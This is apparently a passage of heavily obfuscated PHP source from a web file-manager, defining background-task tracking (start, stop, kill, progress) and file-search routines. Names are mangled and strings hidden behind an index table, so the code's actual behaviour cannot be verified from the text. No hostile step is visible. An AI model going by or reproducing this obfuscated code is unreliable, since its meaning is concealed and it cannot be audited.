$Üëíè´¼[1966]: $³Ê‰ÖÙ = Hook::apply($òÃÎÛœ[$Üëíè´¼[1563]]); default: break; } Model($Üëíè´¼[1967])->add(array($Üëíè´¼[1968] => $Üëíè´¼[12], $Üëíè´¼[1969] => $Üëíè´¼[228], $Üëíè´¼[33] => $Üëíè´¼[1970] . $òÃÎÛœ[$Üëíè´¼[487]], $Üëíè´¼[1971] => json_encode(array($Üëíè´¼[32] => $òÃÎÛœ[$Üëíè´¼[32]], $Üëíè´¼[1972] => timeFloat() - $ãÜáÎ´Ã, $Üëíè´¼[856] => $³Ê‰ÖÙ)))); $ÉĞ×êã = $³Ê‰ÖÙ ? $Üëíè´¼[1973] . $³Ê‰ÖÙ : $Üëíè´¼[12]; self::log($Üëíè´¼[1974] . $òÃÎÛœ[$Üëíè´¼[487]] . $Üëíè´¼[175] . $ÉĞ×êã); return !0; } public static function valueGet($‘€Ëé‘œ) { $Ü¤àœÔ =& $_SERVER[©—Ò»ÅĞ]; $Ğ´áò¸ = $Ü¤àœÔ[1975]; $ó±Ğ£™ğ = Model($Ü¤àœÔ[522])->get($‘€Ëé‘œ, $Ğ´áò¸); if (is_null($ó±Ğ£™ğ)) { Model($Ü¤àœÔ[522])->set($Ü¤àœÔ[850], $Ü¤àœÔ[91], $Ğ´áò¸); Model($Ü¤àœÔ[522])->set($Ü¤àœÔ[939], $Ü¤àœÔ[228], $Ğ´áò¸); $ó±Ğ£™ğ = Model($Ü¤àœÔ[522])->get($‘€Ëé‘œ, $Ğ´áò¸); } return $ó±Ğ£™ğ; } private static function valueSet($‰¨ºùè³, $¿‘Á–Éí = false) { $æ×¨œ¶Ê =& $_SERVER[©—Ò»ÅĞ]; $®½¨é‡ = $æ×¨œ¶Ê[1976]; CacheLock::lock($®½¨é‡); $ŒŠƒ¤ŠÁ = Model($æ×¨œ¶Ê[522])->set($‰¨ºùè³, $¿‘Á–Éí, $æ×¨œ¶Ê[1975]); CacheLock::unlock($®½¨é‡); return $ŒŠƒ¤ŠÁ; } protected static function log($“Ú·ä”à) { write_log($“Ú·ä”à, $_SERVER[©—Ò»ÅĞ][1962]); } private static function cacheClear() { $–’ĞÄÖ¬ =& $_SERVER[©—Ò»ÅĞ]; Cache::clearMemory(Model($–’ĞÄÖ¬[522])->cacheKey($–’ĞÄÖ¬[1975])); Cache::clearMemory(Model($–’ĞÄÖ¬[522])->cacheKey($–’ĞÄÖ¬[1977])); Model($–’ĞÄÖ¬[1947])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\x74\157\x70"; const STATYS_RUNNING = "\162\x75\156\x6e\151\156\x67"; const STATYS_KILL = "\x6b\151\154\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($Ò§ı¥†ò, $€™¨§©Š = '', $¹÷Å¶¬ó = 0, $“´«¨Ö£ = '') { $ÎÚùüÉ© =& $_SERVER[©—Ò»ÅĞ]; if (self::get($Ò§ı¥†ò)) { return; } $this->task = array($ÎÚùüÉ©[487] => $Ò§ı¥†ò, $ÎÚùüÉ©[1592] => USER_ID, $ÎÚùüÉ©[1865] => $“´«¨Ö£, $ÎÚùüÉ©[540] => $ÎÚùüÉ©[12], $ÎÚùüÉ©[33] => $€™¨§©Š, $ÎÚùüÉ©[1234] => $ÎÚùüÉ©[12], $ÎÚùüÉ©[1232] => $¹÷Å¶¬ó, $ÎÚùüÉ©[1978] => 0, $ÎÚùüÉ©[1979] => 0, $ÎÚùüÉ©[1980] => 0, $ÎÚùüÉ©[1981] => timeFloat(), $ÎÚùüÉ©[1982] => 0, $ÎÚùüÉ©[1983] => 0, $ÎÚùüÉ©[1984] => 0, $ÎÚùüÉ©[1985] => 0, $ÎÚùüÉ©[850] => $ÎÚùüÉ©[939]); $GLOBALS[$ÎÚùüÉ©[1986]] = 1; Hook::bind($ÎÚùüÉ©[1932], array($this, $ÎÚùüÉ©[1987])); Hook::bind($ÎÚùüÉ©[1988], array($this, $ÎÚùüÉ©[1989])); $this->startAfter(); Hook::trigger($ÎÚùüÉ©[1990], $this->task); $this->task[$ÎÚùüÉ©[1983]] = timeFloat(); } public function end($³»ÒÈ¸œ = '') { $™½¨˜Òç =& $_SERVER[©—Ò»ÅĞ]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$™½¨˜Òç[1983]]) { self::valueSet($this->task[$™½¨˜Òç[487]], !1); } $this->isEnd = !0; if ($³»ÒÈ¸œ) { $this->task[$™½¨˜Òç[540]] = $³»ÒÈ¸œ; } self::log($™½¨˜Òç[1991] . $this->task[$™½¨˜Òç[487]] . $™½¨˜Òç[1992] . sprintf($™½¨˜Òç[1008], timeFloat() - $this->task[$™½¨˜Òç[1981]]) . $™½¨˜Òç[1993]); Hook::unbind($™½¨˜Òç[1932], array($this, $™½¨˜Òç[1987])); Hook::unbind($™½¨˜Òç[1988], array($this, $™½¨˜Òç[1989])); $this->endAfter(); $Àóœøß = $this->task; $this->task = !1; Hook::trigger($™½¨˜Òç[1994], $Àóœøß); } public function update($ø‡‚Î² = 0, $”ëŞØ˜ = false) { $•¦Â ’ =& $_SERVER[©—Ò»ÅĞ]; $¹¸¸ğÀë =& $this->task; if (!$¹¸¸ğÀë) { return; } $¹¸¸ğÀë[$•¦Â ’[1978]] += $ø‡‚Î²; $¹¸¸ğÀë[$•¦Â ’[1982]] = timeFloat(); if ($¹¸¸ğÀë[$•¦Â ’[1232]]) { if ($¹¸¸ğÀë[$•¦Â ’[1232]] < $¹¸¸ğÀë[$•¦Â ’[1978]]) { $¹¸¸ğÀë[$•¦Â ’[1232]] = $¹¸¸ğÀë[$•¦Â ’[1978]]; } $ƒüÎ€¹³ = timeFloat() - $¹¸¸ğÀë[$•¦Â ’[1981]] - $¹¸¸ğÀë[$•¦Â ’[1984]]; if ($ƒüÎ€¹³ <= 0) { $ƒüÎ€¹³ = 0.001; } $¹¸¸ğÀë[$•¦Â ’[1979]] = $¹¸¸ğÀë[$•¦Â ’[1978]] / $¹¸¸ğÀë[$•¦Â ’[1232]]; $¹¸¸ğÀë[$•¦Â ’[1980]] = $¹¸¸ğÀë[$•¦Â ’[1978]] / $ƒüÎ€¹³; if ($¹¸¸ğÀë[$•¦Â ’[1979]] > 0) { $¹¸¸ğÀë[$•¦Â ’[1985]] = $ƒüÎ€¹³ * (1 - $¹¸¸ğÀë[$•¦Â ’[1979]]) / $¹¸¸ğÀë[$•¦Â ’[1979]]; } $¹¸¸ğÀë[$•¦Â ’[1985]] = $¹¸¸ğÀë[$•¦Â ’[1985]] <= 0 ? 0 : $¹¸¸ğÀë[$•¦Â ’[1985]]; } $this->updateAfter(); $–İŒúœ• = 0.2; if (timeFloat() - $¹¸¸ğÀë[$•¦Â ’[1983]] < $–İŒúœ• && !$”ëŞØ˜) { return; } $¡äÏÔô = self::get($¹¸¸ğÀë[$•¦Â ’[487]]); $§İÛÆß = $¡äÏÔô[$•¦Â ’[850]]; if ($§İÛÆß == self::STATYS_KILL) { $Éáá…Çò = array($•¦Â ’[1995] => LNG($•¦Â ’[1996]), $•¦Â ’[1402] => !1); Cache::set($•¦Â ’[1997] . $this->task[$•¦Â ’[487]], $Éáá…Çò, 30); $this->onKill(); $this->end(); die; } else { if ($§İÛÆß == self::STATYS_STOP) { $ü‚ßÇ‡ú = 2; $¡äÏÔô[$•¦Â ’[1984]] += $ü‚ßÇ‡ú; self::valueSet($¹¸¸ğÀë[$•¦Â ’[487]], $¡äÏÔô); sleep($ü‚ßÇ‡ú); $this->update(); return; } } $¹¸¸ğÀë[$•¦Â ’[850]] = $§İÛÆß ? $§İÛÆß : $¹¸¸ğÀë[$•¦Â ’[850]]; $¹¸¸ğÀë[$•¦Â ’[1984]] = $¡äÏÔô[$•¦Â ’[1984]] ? $¡äÏÔô[$•¦Â ’[1984]] : 0; $¹¸¸ğÀë[$•¦Â ’[1983]] = timeFloat(); Hook::trigger($•¦Â ’[1998], $¹¸¸ğÀë); self::valueSet($¹¸¸ğÀë[$•¦Â ’[487]], $¹¸¸ğÀë); } public function onKillSet($«ÓŞäæË, $ æÒ¶ŸÈ = array()) { $this->onKillCall = array($«ÓŞäæË, $ æÒ¶ŸÈ); } public function onKill() { $ ¿íùÔ =& $_SERVER[©—Ò»ÅĞ]; self::log($ ¿íùÔ[1991] . $this->task[$ ¿íùÔ[487]] . $ ¿íùÔ[1999]); Hook::trigger($ ¿íùÔ[2000], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($…ø©ª¶¹) { $é‚ÓåÁ =& $_SERVER[©—Ò»ÅĞ]; Cache::set($é‚ÓåÁ[1997] . $this->task[$é‚ÓåÁ[487]], $…ø©ª¶¹, 60); if (!is_array($…ø©ª¶¹) || !$…ø©ª¶¹[$é‚ÓåÁ[1402]]) { self::log($é‚ÓåÁ[2001] . json_encode($…ø©ª¶¹)); } return $…ø©ª¶¹; } public static function get($´š¥¯ª¦) { $ˆòıÅ’† =& $_SERVER[©—Ò»ÅĞ]; $ÀÊª¼Û’ = self::valueGet($´š¥¯ª¦); if (is_array($ÀÊª¼Û’) && $ÀÊª¼Û’[$ˆòıÅ’†[2002]]) { $Ÿñƒøëª = ActionApply($ÀÊª¼Û’[$ˆòıÅ’†[2002]], array($ÀÊª¼Û’)); $ÀÊª¼Û’ = is_array($Ÿñƒøëª) ? $Ÿñƒøëª : $ÀÊª¼Û’; } return $ÀÊª¼Û’; } public static function listData() { $÷“¤øŸ· = self::valueGet(); return array_sort_by($÷“¤øŸ·, $_SERVER[©—Ò»ÅĞ][1981], !0); } public static function kill($ªŸŠº§á) { return self::changeStatus($ªŸŠº§á, self::STATYS_KILL); } public static function stop($è©çÛø¯) { return self::changeStatus($è©çÛø¯, self::STATYS_STOP); } public static function restart($’¨½ö¦) { return self::changeStatus($’¨½ö¦, self::STATYS_RUNNING); } public static function killAll() { $‰ÜªÌéÆ =& $_SERVER[©—Ò»ÅĞ]; $Îûİ¸øá = self::listData(); foreach ($Îûİ¸øá as $Ÿ™µ°Ş) { self::kill($Ÿ™µ°Ş[$‰ÜªÌéÆ[487]]); } sleep(2); foreach ($Îûİ¸øá as $Ÿ™µ°Ş) { self::valueSet($Ÿ™µ°Ş[$‰ÜªÌéÆ[487]], !1); } } private static function changeStatus($œæ²é™÷, $ô¿­Ÿ•) { $ıÖıâğ =& $_SERVER[©—Ò»ÅĞ]; $äçì»•¬ = self::valueGet($œæ²é™÷); if (!$äçì»•¬) { return !1; } $äçì»•¬[$ıÖıâğ[850]] = $ô¿­Ÿ•; self::valueSet($œæ²é™÷, $äçì»•¬); self::log($ıÖıâğ[2003] . $äçì»•¬[$ıÖıâğ[487]] . $ıÖıâğ[2004] . $ô¿­Ÿ•); return !0; } public static function valueGet($Š£Øæğ‚ = false) { $áƒ€ô‹» =& $_SERVER[©—Ò»ÅĞ]; if ($Š£Øæğ‚) { $Ø‚ÈÒòó = Model($áƒ€ô‹»[534])->where(array($áƒ€ô‹»[95] => $Š£Øæğ‚, $áƒ€ô‹»[33] => $áƒ€ô‹»[1241]))->find(); return $Ø‚ÈÒòó ? json_decode($Ø‚ÈÒòó[$áƒ€ô‹»[451]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ûƒİœ = false) { $‚ê‘‡ĞÌ =& $_SERVER[©—Ò»ÅĞ]; $¼œµ“ñé = array($‚ê‘‡ĞÌ[33] => $‚ê‘‡ĞÌ[1241]); if ($ûƒİœ) { $¼œµ“ñé[$‚ê‘‡ĞÌ[1592]] = $ûƒİœ; } $í’Û„ï = Model($‚ê‘‡ĞÌ[534])->where($¼œµ“ñé)->select(); $í’Û„ï = $í’Û„ï ? $í’Û„ï : array(); foreach ($í’Û„ï as $‰ûÛ¬¯• => $«¶±Ø×Ä) { $í’Û„ï[$‰ûÛ¬¯•] = json_decode($«¶±Ø×Ä[$‚ê‘‡ĞÌ[451]], !0); } return $í’Û„ï; } public static function valueSet($æãÕÖ¤í, $éÇáÈÛÎ) { $ûßÇ“„ö =& $_SERVER[©—Ò»ÅĞ]; if (!$éÇáÈÛÎ) { return Model($ûßÇ“„ö[534])->where(array($ûßÇ“„ö[95] => $æãÕÖ¤í, $ûßÇ“„ö[33] => $ûßÇ“„ö[1241]))->delete(); } $›æ­ÊÀİ = json_encode($éÇáÈÛÎ); if (!$›æ­ÊÀİ) { ob_start(); var_dump($éÇáÈÛÎ); $Íİ¸·úÍ = ob_get_clean(); self::log($ûßÇ“„ö[2005] . json_encode_force($Íİ¸·úÍ)); } if (!$æãÕÖ¤í || !$éÇáÈÛÎ[$ûßÇ“„ö[487]]) { return !1; } $ãü¸è´ = array($ûßÇ“„ö[33] => $ûßÇ“„ö[1241], $ûßÇ“„ö[1592] => USER_ID, $ûßÇ“„ö[95] => $æãÕÖ¤í, $ûßÇ“„ö[451] => $›æ­ÊÀİ); $áÅ×‚ºÓ = $ûßÇ“„ö[2006]; CacheLock::lock($áÅ×‚ºÓ); Model($ûßÇ“„ö[534])->add($ãü¸è´, array(), !0); CacheLock::unlock($áÅ×‚ºÓ); } public static function log($Ò¼ˆ²®”) { if (!GLOBAL_DEBUG) { return; } write_log($Ò¼ˆ²®”, $_SERVER[©—Ò»ÅĞ][2007]); } } goto Bõì–ÇÕ£ó; DĞùĞ‡¾Ğ‚: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($”ÆòÜåŞ) { $é¯Ï¸Şé =& $_SERVER[©—Ò»ÅĞ]; $­Ù‹ªƒõ = KodIO::fileTypeList(); $ûØ…Ğ­î = $­Ù‹ªƒõ[$”ÆòÜåŞ]; if (!$ûØ…Ğ­î) { return array(); } $Ïã™¬ï» = $ûØ…Ğ­î[$é¯Ï¸Şé[166]]; $ªæÈÇ´— = $é¯Ï¸Şé[7]; if (!$ûØ…Ğ­î[$é¯Ï¸Şé[166]]) { $»×¥ïÅ = array_to_keyvalue($­Ù‹ªƒõ, $é¯Ï¸Şé[12], $é¯Ï¸Şé[166]); $Ïã™¬ï» = implode($é¯Ï¸Şé[50], $»×¥ïÅ); $ªæÈÇ´— = $é¯Ï¸Şé[2447]; } $õÂí·—ˆ = explode($é¯Ï¸Şé[50], trim($Ïã™¬ï», $é¯Ï¸Şé[50])); return array($ªæÈÇ´—, $õÂí·—ˆ); } public function listPathType($ÛØ•ıòâ) { $‹°ı½áî =& $_SERVER[©—Ò»ÅĞ]; $ïÚììè× = $this->fileTypeWhere($ÛØ•ıòâ); if (!$ïÚììè×) { return array(); } $“§÷˜â = USER_ID; $Àê—ü¤ = Model($‹°ı½áî[617])->getInfo($“§÷˜â); $”ƒäÛÛ÷ = array($‹°ı½áî[670] => SourceModel::TYPE_USER, $‹°ı½áî[604] => array($‹°ı½áî[635], $‹°ı½áî[613] . $Àê—ü¤[$‹°ı½áî[90]][$‹°ı½áî[191]] . $‹°ı½áî[636]), $‹°ı½áî[671] => $“§÷˜â, $‹°ı½áî[668] => 0, $‹°ı½áî[669] => $ïÚììè×); return $this->listSource($”ƒäÛÛ÷); } public function listSearch($Ï´ÊÚÅÎ, $ÍîÑºş¿ = 300) { $¨–¯ÀÁ =& $_SERVER[©—Ò»ÅĞ]; if (isset($Ï´ÊÚÅÎ[$¨–¯ÀÁ[2281]]) && $Ï´ÊÚÅÎ[$¨–¯ÀÁ[2281]]) { $Ï´ÊÚÅÎ[$¨–¯ÀÁ[2281]] = str_replace($¨–¯ÀÁ[474], $¨–¯ÀÁ[2448], trim($Ï´ÊÚÅÎ[$¨–¯ÀÁ[2281]])); } $ØÀ§Êò = $this->_parseSearchWhere($Ï´ÊÚÅÎ); if (!isset($ØÀ§Êò[$¨–¯ÀÁ[520]])) { $ØÀ§Êò[$¨–¯ÀÁ[520]] = 0; } $†Ğ£¥ ª = $¨–¯ÀÁ[2449]; $ÜÔ‚¼–İ = $ØÀ§Êò; $Ó†Â±Ü  = $†Ğ£¥ ª; $this->_listSearchBindPinyin($Ï´ÊÚÅÎ, $ØÀ§Êò, $†Ğ£¥ ª); $this->alias($¨–¯ÀÁ[533])->_makeOrder(); $ØÀ§Êò = $this->parseWhereLike($ØÀ§Êò); $ÀÅÙœÄÏ = $this->distinct(!0)->field($†Ğ£¥ ª)->where($ØÀ§Êò)->selectPage($ÍîÑºş¿); if ($GLOBALS[$¨–¯ÀÁ[6]][$¨–¯ÀÁ[468]][$¨–¯ÀÁ[469]] && Input::check($Ï´ÊÚÅÎ[$¨–¯ÀÁ[2281]], $¨–¯ÀÁ[677]) && $ÀÅÙœÄÏ[$¨–¯ÀÁ[443]][$¨–¯ÀÁ[428]] == 1 && $ÀÅÙœÄÏ[$¨–¯ÀÁ[443]][$¨–¯ÀÁ[444]] == 0) { $ÀÅÙœÄÏ = $this->distinct(!0)->field($†Ğ£¥ ª)->where($ÜÔ‚¼–İ)->limit(1000)->select(); $ÀÅÙœÄÏ = array_page_split($ÀÅÙœÄÏ, !1, $ÍîÑºş¿); } $this->_listSearchFileContent($ÀÅÙœÄÏ, $Ï´ÊÚÅÎ, $Ó†Â±Ü , $ÜÔ‚¼–İ); $this->_listSearchDesc($ÀÅÙœÄÏ, $Ï´ÊÚÅÎ, $Ó†Â±Ü ); $this->_listSearchTag($ÀÅÙœÄÏ, $Ï´ÊÚÅÎ, $Ó†Â±Ü ); $this->_listSearchGroupTag($ÀÅÙœÄÏ, $Ï´ÊÚÅÎ, $Ó†Â±Ü ); $this->_listDataApply($ÀÅÙœÄÏ[$¨–¯ÀÁ[446]]); $this->_listMake($ÀÅÙœÄÏ); return $ÀÅÙœÄÏ; } private function _listSearchFileContent(&$¹İ‹ÖÏ­, $¥¾¹¨ıÎ, $ì À”²¼, $¥Àë€ÛÂ) { $‡ØßıÊÉ =& $_SERVER[©—Ò»ÅĞ]; if (!$¥¾¹¨ıÎ[$‡ØßıÊÉ[2281]] || $¹İ‹ÖÏ­[$‡ØßıÊÉ[443]][$‡ØßıÊÉ[428]] > 1) { return; } if (!isset($¥Àë€ÛÂ[$‡ØßıÊÉ[32]]) || !is_array($¥¾¹¨ıÎ[$‡ØßıÊÉ[557]]) || !$¥¾¹¨ıÎ[$‡ØßıÊÉ[557]]) { return; } $¥Àë€ÛÂ[$‡ØßıÊÉ[557]] = array($‡ØßıÊÉ[7], $¥¾¹¨ıÎ[$‡ØßıÊÉ[557]]); unset($¥Àë€ÛÂ[$‡ØßıÊÉ[32]]); unset($¥¾¹¨ıÎ[$‡ØßıÊÉ[557]]); $§¸–àãø = $this->field($ì À”²¼)->where($¥Àë€ÛÂ)->limit($‡ØßıÊÉ[2450])->select(); $§¸–àãø = array_to_keyvalue($§¸–àãø, $‡ØßıÊÉ[191], $‡ØßıÊÉ[12]); $‹ ŠÀ¬ = array_to_keyvalue($¹İ‹ÖÏ­[$‡ØßıÊÉ[446]], $‡ØßıÊÉ[191], $‡ØßıÊÉ[12]); $Ùİ„ªİ = array(); foreach ($§¸–àãø as $™»éîü => $õ¸€Ä†š) { if (!$‹ ŠÀ¬[$™»éîü]) { $Ùİ„ªİ[] = $õ¸€Ä†š; } } if (!$Ùİ„ªİ) { return; } $¹İ‹ÖÏ­[$‡ØßıÊÉ[446]] = array_merge($Ùİ„ªİ, $¹İ‹ÖÏ­[$‡ØßıÊÉ[446]]); $¹İ‹ÖÏ­[$‡ØßıÊÉ[443]][$‡ØßıÊÉ[444]] += count($Ùİ„ªİ); } private function _listSearchTag(&$Ê³¥¹ĞÍ, $çüÛíÇ, $‚¥ŠôœÚ) { $ùÈƒø¬ =& $_SERVER[©—Ò»ÅĞ]; if (empty($çüÛíÇ[$ùÈƒø¬[2144]]) || !in_array($ùÈƒø¬[2451], $çüÛíÇ[$ùÈƒø¬[2144]])) { return; } if (!$çüÛíÇ[$ùÈƒø¬[2281]] || $Ê³¥¹ĞÍ[$ùÈƒø¬[443]][$ùÈƒø¬[428]] > 1) { return; } $–‡‚ø†º = Model($ùÈƒø¬[2452])->listData(); $ºø€½³— = array(); $ô¯÷Å›ê = $çüÛíÇ[$ùÈƒø¬[2281]]; foreach ($–‡‚ø†º as $äšÛú¼) { $ë½â­ó´ = $äšÛú¼[$ùÈƒø¬[32]]; $­Øˆ»°› = str_replace($ùÈƒø¬[53], $ùÈƒø¬[12], Pinyin::get($ë½â­ó´)); if (stripos($ë½â­ó´, $ô¯÷Å›ê) !== !1 || stripos($­Øˆ»°›, $ô¯÷Å›ê) !== !1) { $ºø€½³—[] = $äšÛú¼[$ùÈƒø¬[487]]; } } if (!$ºø€½³—) { return; } $Ë¦€ƒÍè = array($ùÈƒø¬[515] => array($ùÈƒø¬[7], $ºø€½³—), $ùÈƒø¬[1592] => USER_ID); $‚¢¥¤– = Model($ùÈƒø¬[517])->field($ùÈƒø¬[87])->where($Ë¦€ƒÍè)->select(); $‚¢¥¤– = array_to_keyvalue($‚¢¥¤–, $ùÈƒø¬[12], $ùÈƒø¬[87]); $­‰³¢õğ = array_unique($‚¢¥¤–); $this->_listSearchMerge($Ê³¥¹ĞÍ, $çüÛíÇ, $‚¥ŠôœÚ, $­‰³¢õğ); } private function _listSearchDesc(&$ïÓ„¾¬µ, $ÙË®šŠ¤, $˜£‡³Í…) { $¦÷’—û• =& $_SERVER[©—Ò»ÅĞ]; if (empty($ÙË®šŠ¤[$¦÷’—û•[2144]]) || !in_array($¦÷’—û•[540], $ÙË®šŠ¤[$¦÷’—û•[2144]])) { return; } if (!$ÙË®šŠ¤[$¦÷’—û•[2281]] || $ïÓ„¾¬µ[$¦÷’—û•[443]][$¦÷’—û•[428]] > 1) { return; } $•âŸê´ì = array($¦÷’—û•[95] => $¦÷’—û•[540], $¦÷’—û•[451] => array($¦÷’—û•[473], $¦÷’—û•[2283] . $ÙË®šŠ¤[$¦÷’—û•[2281]] . $¦÷’—û•[2283])); $í€£•ñ® = !1; if ($í€£•ñ®) { $òæÍ¡¿è = $this->listSearchChildren($ÙË®šŠ¤[$¦÷’—û•[190]]); $òæÍ¡¿è = array_unique($òæÍ¡¿è); if (!$òæÍ¡¿è) { return; } $•âŸê´ì[$¦÷’—û•[191]] = array($¦÷’—û•[7], $òæÍ¡¿è); } $¹÷ÇÙ‡ = Model($¦÷’—û•[471])->field($¦÷’—û•[191])->where($•âŸê´ì)->limit(5000)->select(); $ÛçßÄı = array_to_keyvalue($¹÷ÇÙ‡, $¦÷’—û•[12], $¦÷’—û•[191]); $this->_listSearchMerge($ïÓ„¾¬µ, $ÙË®šŠ¤, $˜£‡³Í…, $ÛçßÄı); } private function _listSearchGroupTag(&$ÜËÀ¯ç, $¾® ™‡‘, $Á…âşÓ£) { $†Šá«Âœ =& $_SERVER[©—Ò»ÅĞ]; if (empty($¾® ™‡‘[$†Šá«Âœ[2144]]) || !in_array($†Šá«Âœ[2451], $¾® ™‡‘[$†Šá«Âœ[2144]])) { return; } if (!$¾® ™‡‘[$†Šá«Âœ[2281]] || $ÜËÀ¯ç[$†Šá«Âœ[443]][$†Šá«Âœ[428]] > 1 || !$¾® ™‡‘[$†Šá«Âœ[190]]) { return; } $‰ÜÎî’Ê = $this->sourceInfo($¾® ™‡‘[$†Šá«Âœ[190]]); if (!$‰ÜÎî’Ê || $‰ÜÎî’Ê[$†Šá«Âœ[188]] != SourceModel::TYPE_GROUP) { return; } $ÓáÕËÆ = $‰ÜÎî’Ê[$†Šá«Âœ[589]]; $âûúÓµ˜ = Model($†Šá«Âœ[2453])->get($ÓáÕËÆ); $«‹¨İ· = array(); $§åß“ = $¾® ™‡‘[$†Šá«Âœ[2281]]; foreach ($âûúÓµ˜[$†Šá«Âœ[446]] as $¾‚¸ğÏÖ) { $ßÌÆÖÉ = $¾‚¸ğÏÖ[$†Šá«Âœ[32]]; $ûä‹±»’ = str_replace($†Šá«Âœ[53], $†Šá«Âœ[12], Pinyin::get($ßÌÆÖÉ)); if (stripos($ßÌÆÖÉ, $§åß“) !== !1 || stripos($ûä‹±»’, $§åß“) !== !1) { $«‹¨İ·[] = $¾‚¸ğÏÖ[$†Šá«Âœ[487]]; } } if (!$«‹¨İ·) { return; } $Î¨¢“—œ = array($†Šá«Âœ[515] => array($†Šá«Âœ[7], $«‹¨İ·), $†Šá«Âœ[1592] => 0, $†Šá«Âœ[33] => $†Šá«Âœ[1491] . $ÓáÕËÆ); $‡¸¥Š¯ˆ = Model($†Šá«Âœ[517])->field($†Šá«Âœ[87])->where($Î¨¢“—œ)->select(); $‡¸¥Š¯ˆ = array_to_keyvalue($‡¸¥Š¯ˆ, $†Šá«Âœ[12], $†Šá«Âœ[87]); $Ş¦éç = array_unique($‡¸¥Š¯ˆ); $this->_listSearchMerge($ÜËÀ¯ç, $¾® ™‡‘, $Á…âşÓ£, $Ş¦éç); } private function _listSearchMerge(&$Á’ÅŞÎ‚, $¼ĞÉ®‰, $Ó¦é¾×, $“™ßÃ°) { $Ç÷’Ëñø =& $_SERVER[©—Ò»ÅĞ]; if (!$“™ßÃ°) { return; } $¿é­¬º = array_to_keyvalue($Á’ÅŞÎ‚[$Ç÷’Ëñø[446]], $Ç÷’Ëñø[12], $Ç÷’Ëñø[191]); $ñ¼ı¹ø­ = array_diff($“™ßÃ°, $¿é­¬º); if (!$ñ¼ı¹ø­) { return; } $Û¥° ú’ = array($Ç÷’Ëñø[191] => array($Ç÷’Ëñø[7], $ñ¼ı¹ø­)); $›Îï¯¢¯ = $this->field($Ó¦é¾×)->where($Û¥° ú’)->select(); if (!$›Îï¯¢¯) { return; } $ƒ¡ùÈœ = array(); foreach ($›Îï¯¢¯ as $Ï…éÉ€¼) { if ($this->_listSearchFilter($Ï…éÉ€¼, $¼ĞÉ®‰)) { $ƒ¡ùÈœ[] = $Ï…éÉ€¼; } } $Á’ÅŞÎ‚[$Ç÷’Ëñø[446]] = array_merge($ƒ¡ùÈœ, $Á’ÅŞÎ‚[$Ç÷’Ëñø[446]]); $Á’ÅŞÎ‚[$Ç÷’Ëñø[443]][$Ç÷’Ëñø[444]] += count($ƒ¡ùÈœ); } private function _listSearchFilter($ ”ÊûáÏ, $à¬´‹ãë) { $¡ôŞ†£Ó =& $_SERVER[©—Ò»ÅĞ]; $ô«Ä› = $ ”ÊûáÏ[$¡ôŞ†£Ó[500]] == $¡ôŞ†£Ó[91]; if (!strstr($ ”ÊûáÏ[$¡ôŞ†£Ó[604]], $¡ôŞ†£Ó[50] . $à¬´‹ãë[$¡ôŞ†£Ó[190]] . $¡ôŞ†£Ó[50])) { return !1; } if (isset($à¬´‹ãë[$¡ôŞ†£Ó[501]]) && $à¬´‹ãë[$¡ôŞ†£Ó[501]] != $¡ôŞ†£Ó[944]) { if ($à¬´‹ãë[$¡ôŞ†£Ó[501]] == $¡ôŞ†£Ó[78] && !$ô«Ä›) { return !1; } if ($à¬´‹ãë[$¡ôŞ†£Ó[501]] != $¡ôŞ†£Ó[78] && $ô«Ä›) { return !1; } if (!strstr($ ”ÊûáÏ[$¡ôŞ†£Ó[166]], $¡ôŞ†£Ó[50] . $à¬´‹ãë[$¡ôŞ†£Ó[501]] . $¡ôŞ†£Ó[50])) { return !1; } } if (isset($à¬´‹ãë[$¡ôŞ†£Ó[2454]]) && $à¬´‹ãë[$¡ôŞ†£Ó[2454]] < $ ”ÊûáÏ[$¡ôŞ†£Ó[79]]) { return !1; } if (isset($à¬´‹ãë[$¡ôŞ†£Ó[2455]]) && $à¬´‹ãë[$¡ôŞ†£Ó[2455]] > $ ”ÊûáÏ[$¡ôŞ†£Ó[79]]) { return !1; } if (isset($à¬´‹ãë[$¡ôŞ†£Ó[684]]) && $à¬´‹ãë[$¡ôŞ†£Ó[684]] != $ ”ÊûáÏ[$¡ôŞ†£Ó[543]]) { return !1; } return !0; } public function listSearchChildren($Ù¸À‹, $¹»©•Š = 5000) { $ÖˆâŠ® =& $_SERVER[©—Ò»ÅĞ]; $Æù¤´¾‘ = array(); $²ú—ú«“ = $this->sourceInfo($Ù¸À‹); $š«üíë = array($ÖˆâŠ®[604] => array($ÖˆâŠ®[473], $²ú—ú«“[$ÖˆâŠ®[604]] . $²ú—ú«“[$ÖˆâŠ®[191]] . $ÖˆâŠ®[636])); $óä™€µ˜ = $this->field($ÖˆâŠ®[79])->where($š«üíë)->limit($¹»©•Š + 1)->select(); $ùşêşÄ = is_array($óä™€µ˜) ? count($óä™€µ˜) : 0; if ($ùşêşÄ > $¹»©•Š) { return $this->listChildrenDeep($Ù¸À‹, $¹»©•Š, 3); } $¹ÈªÈ…¾ = $this->field($ÖˆâŠ®[191])->where($š«üíë)->select(); $Æù¤´¾‘ = array_to_keyvalue($¹ÈªÈ…¾, $ÖˆâŠ®[12], $ÖˆâŠ®[191]); return $Æù¤´¾‘; } public function listChildrenDeep($ñ—¡Ó½, $‘¶Ç¼ºÈ, $±ì¸ê´ù = 3) { $õ¬º¬æ =& $_SERVER[©—Ò»ÅĞ]; $êÏîâµÑ = array(); $ó‰ö©’ = array($ñ—¡Ó½); for ($ÂÜÕûÀ = 0; $ÂÜÕûÀ < $±ì¸ê´ù; $ÂÜÕûÀ++) { $„Ö‡ŞêÍ = array($õ¬º¬æ[190] => array($õ¬º¬æ[7], $ó‰ö©’)); $³¬µ©ŸÏ = $this->field($õ¬º¬æ[2456])->where($„Ö‡ŞêÍ)->select(); $ó‰ö©’ = array_to_keyvalue(array_filter_by_field($³¬µ©ŸÏ, $õ¬º¬æ[500], $õ¬º¬æ[91]), $õ¬º¬æ[12], $õ¬º¬æ[191]); $êÏîâµÑ = array_merge($êÏîâµÑ, array_to_keyvalue($³¬µ©ŸÏ, $õ¬º¬æ[12], $õ¬º¬æ[191])); if (!$ó‰ö©’ 